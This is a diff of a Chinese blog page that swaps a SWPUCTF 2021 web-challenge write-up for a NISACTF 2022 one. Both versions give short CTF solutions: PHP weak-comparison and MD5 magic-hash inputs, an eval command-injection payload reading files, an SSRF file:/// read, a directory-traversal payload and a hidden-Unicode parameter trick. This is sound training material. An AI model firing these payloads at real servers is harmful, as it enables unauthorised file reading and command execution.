@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/11/14/swpuctf-2021-新生赛/"/>
+  <link rel="canonical" href="http://example.com/2022/11/17/nisactf-2022/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,19 +32,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>SWPUCTF 2021 新生赛 - Chen</title>
+  <title>NISACTF 2022 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="SWPUCTF 2021 新生赛">
-<meta property="og:url" content="http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/index.html">
+<meta property="og:title" content="NISACTF 2022">
+<meta property="og:url" content="http://example.com/2022/11/17/NISACTF-2022/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="这篇用来记录SWPUCTF 2021 新生赛web刷题记录 gift_F12123456789101112131415161718192021&lt;script language&#x3D;&quot;javascript&quot;&gt;    function show_date_time() &amp;#123;        flag &#x3D; &quot;WLLMCTF&amp;#123;We1c0me_t0_WL">
+<meta property="og:description" content="easyssrf题目提示说是ssrf https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2115 这里猜测是利用file协议来打开相应的文件 1payload &#x3D; file:&#x2F;&#x2F;&#x2F;flag  返回:都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g 1payload &#x3D; file:&#x2F;&#x2F;&#x2F;fl4g  返回: file:&#x2F;&#x2F;&#x2F;fl4g 的快照如下：你应该">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-11-14T03:12:53.000Z">
-<meta property="article:modified_time" content="2022-11-16T10:14:31.910Z">
+<meta property="article:published_time" content="2022-11-17T03:14:57.000Z">
+<meta property="article:modified_time" content="2022-11-17T05:13:23.230Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2363,7 +2363,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/SWPUCTF-2021-新生赛/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/17/NISACTF-2022/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2384,7 +2384,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        SWPUCTF 2021 新生赛
+        NISACTF 2022
       </h1>
       <div class='new-meta-box'>
         
@@ -2415,10 +2415,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-14T11:12:53+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-17T11:14:57+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Nov 14, 2022</p>
+    <p>发布于：Nov 17, 2022</p>
   </a>
 </div>
 
@@ -2441,35 +2441,42 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>这篇用来记录SWPUCTF 2021 新生赛web刷题记录</p>
-<h2 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_date_time</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        flag = <span class="string">&quot;WLLMCTF&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;&quot;</span><span class="comment">//flag is here</span></span><br><span class="line">        window.<span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;show_date_time()&quot;</span>, <span class="number">1000</span>);</span><br><span class="line">        BirthDay = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;10/23/2021 00:00:00&quot;</span>);</span><br><span class="line">        today = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        timeold = (BirthDay.<span class="title function_ invoke__">getTime</span>() - today.<span class="title function_ invoke__">getTime</span>());</span><br><span class="line">        sectimeold = timeold / <span class="number">1000</span></span><br><span class="line">        secondsold = Math.<span class="title function_ invoke__">floor</span>(sectimeold);</span><br><span class="line">        msPerDay = <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span></span><br><span class="line">        e_daysold = timeold / msPerDay</span><br><span class="line">        daysold = Math.<span class="title function_ invoke__">floor</span>(e_daysold);</span><br><span class="line">        e_hrsold = (e_daysold - daysold) * <span class="number">24</span>;</span><br><span class="line">        hrsold = Math.<span class="title function_ invoke__">floor</span>(e_hrsold);</span><br><span class="line">        e_minsold = (e_hrsold - hrsold) * <span class="number">60</span>;</span><br><span class="line">        minsold = Math.<span class="title function_ invoke__">floor</span>((e_hrsold - hrsold) * <span class="number">60</span>);</span><br><span class="line">        seconds = Math.<span class="title function_ invoke__">floor</span>((e_minsold - minsold) * <span class="number">60</span>);</span><br><span class="line">        span_dt_dt.innerHTML = <span class="string">&quot;还有：&quot;</span>+ daysold + <span class="string">&quot;天  &quot;</span> + hrsold + <span class="string">&quot;小时  &quot;</span> + minsold + <span class="string">&quot;分钟  &quot;</span> + seconds + <span class="string">&quot;秒  &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">show_date_time</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+    <h2 id="easyssrf"><a href="#easyssrf" class="headerlink" title="easyssrf"></a>easyssrf</h2><p>题目提示说是ssrf</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2115">https://xz.aliyun.com/t/2115</a></p>
+<p>这里猜测是利用file协议来打开相应的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = file:///flag</span><br></pre></td></tr></table></figure>
 
-<p>查看网页源码后找到flag</p>
-<h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>返回:<strong>都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = file:///fl4g</span><br></pre></td></tr></table></figure>
 
-<p>打开靶机后 给了一段源码</p>
-<p>id需要post传参 x需要json传参</p>
-<p>json传参格式 {“name”:”test”}</p>
-<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zkHk5Q"><img src="https://s1.ax1x.com/2022/11/14/zkHk5Q.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zkHk5Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zkHk5Q.png"></a></p>
-<p>成功得到flag</p>
-<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>返回: <strong>file:&#x2F;&#x2F;&#x2F;fl4g 的快照如下：你应该看看除了index.php，是不是还有个ha1x1ux1u.php</strong></p>
+<p>跟进一下 发现了源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span><span class="title function_ invoke__"> file_get_contents</span>(<span class="variable">$file</span>); </span><br></pre></td></tr></table></figure>
 
-<p>明文需要不同 但是密文需要相同</p>
-<p>因为这里是松散比较 所以有两种办法</p>
-<p>1.使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">314282422</span><br></pre></td></tr></table></figure>
+<p>stristr屏蔽了file协议 那试一下目录穿越</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = ?file=../../../../../../flag</span><br></pre></td></tr></table></figure>
 
-<p>这种办法当遇到’&#x3D;&#x3D;&#x3D;’就会失效</p>
-<p>2.md5不能加密数组，md5加密数组会返回null</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ITmincherry/article/details/96966702">(5条消息) PHP弱类型_ChanCherry、的博客-CSDN博客_php弱类型</a></p>
-<h2 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h2><p>打开后 直接就显示出来了一句话木马 知道了密码以后就可以用蚁剑连接终端 然后在根目录下获得flag</p>
-<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zEM7RS"><img src="https://s1.ax1x.com/2022/11/15/zEM7RS.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/15/zEM7RS.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zEM7RS.png"></a></p>
-<h2 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>成功获得flag</p>
+<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="comment">// ‮⁦NISACTF⁩⁦Welcome to</span></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="string">&quot;jitanglailo&quot;</span> == <span class="variable">$_GET</span>[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦ Flag!⁩⁦N1SACTF&quot;</span> == <span class="variable">$_GET</span>[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; <span class="comment">//tnnd! weishenme b</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p>有一句话木马 但是是get传参 所以并不能使用中国蚁剑来连接虚拟终端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = ?url=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>
+<p>一开始看到以为是最简单的get传参 但是试了一下发现不行 网上查询wp后发现</p>
+<p>猫腻在于php的高亮显示规定 这段源码有不可见字符在作祟 我们选中NISA会发现Welcome也被选中了</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zeIPMR"><img src="https://s1.ax1x.com/2022/11/17/zeIPMR.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/17/zeIPMR.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zeIPMR.png"></a></p>
+<p>我们将源码复制进文本文件 然后用010打开 这样可以显示不可见字符的16进制</p>
+<p>ps:这里我遇到了一个问题 用火狐浏览器复制源码最后和用edge浏览器复制的源码不一样 火狐的源码是错误的 暂时不知道解决原因</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zeIuzd"><img src="https://s1.ax1x.com/2022/11/17/zeIuzd.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/17/zeIuzd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zeIuzd.png"></a></p>
+<p>可以看出第一个参数ahahahaha并没有被动手脚  后方的参数有问题</p>
+<p>选中-&gt;编辑-&gt;复制为-&gt;16进制文本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2 <span class="number">80</span> AE E2 <span class="number">81</span> A6 <span class="number">55</span> <span class="number">67</span> <span class="number">65</span> <span class="number">69</span> <span class="number">77</span> <span class="number">6F</span> E2 <span class="number">81</span> A9 E2 <span class="number">81</span> A6 <span class="number">63</span> <span class="number">75</span> <span class="number">69</span> <span class="number">73</span> <span class="number">68</span> <span class="number">69</span> <span class="number">79</span> <span class="number">75</span> <span class="number">61</span> <span class="number">6</span>E <span class="comment">//参数名</span></span><br></pre></td></tr></table></figure>
 
-<p>至于为什么需要分号 属于固定格式 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval">https://www.php.net/manual/zh/function.eval</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">55</span>%<span class="number">67</span>%<span class="number">65</span>%<span class="number">69</span>%<span class="number">77</span>%<span class="number">6F</span>%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6%<span class="number">63</span>%<span class="number">75</span>%<span class="number">69</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">69</span>%<span class="number">79</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">6</span>E <span class="comment">//将空格转成%</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2 <span class="number">80</span> AE E2 <span class="number">81</span> A6 <span class="number">20</span> <span class="number">46</span> <span class="number">6</span>C <span class="number">61</span> <span class="number">67</span> <span class="number">21</span> E2 <span class="number">81</span> A9 E2 <span class="number">81</span> A6 <span class="number">4</span>E <span class="number">31</span> <span class="number">53</span> <span class="number">41</span> <span class="number">43</span> <span class="number">54</span> <span class="number">46</span>  <span class="comment">//参数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>%<span class="number">46</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>%<span class="number">21</span>%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6%<span class="number">4</span>E%<span class="number">31</span>%<span class="number">53</span>%<span class="number">41</span>%<span class="number">43</span>%<span class="number">54</span>%<span class="number">46</span> <span class="comment">//同上</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = ?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2494,10 +2501,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-16T18:14:31+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-17T13:13:23+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Nov 16, 2022</p>
+    <p>更新于：Nov 17, 2022</p>
   </a>
 </div>
 
@@ -2516,7 +2523,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/17/NISACTF-2022/&title=NISACTF 2022 - Chen&summary="
           
           >
           
@@ -2528,7 +2535,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/17/NISACTF-2022/&title=NISACTF 2022 - Chen&summary="
           
           >
           
@@ -2540,7 +2547,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/17/NISACTF-2022/&title=NISACTF 2022 - Chen&summary="
           
           >
           
@@ -2573,16 +2580,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/11/14/ciscn-2019-s-3/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>ciscn_2019_s_3</p>
-          <p class='content'>12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enable...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/11/14/babyheap-0ctf-2017/'>
-          <p class='title'>babyheap_0ctf_2017<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>查看一下保护机制
-12345Arch:     amd64-64-littleRELRO:    Full RELROstack:    Canary foundNX:       NX ena...</p>
+        <a class='next' href='/2022/11/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/'>
+          <p class='title'>ACTF新生赛2020_easyre<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>upx加壳 32位
+脱壳完后代码
+12345678910111213141516171819202122232425262728int __cdecl main(int argc, const ...</p>
         </a>
       
     </div>
@@ -2598,7 +2601,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
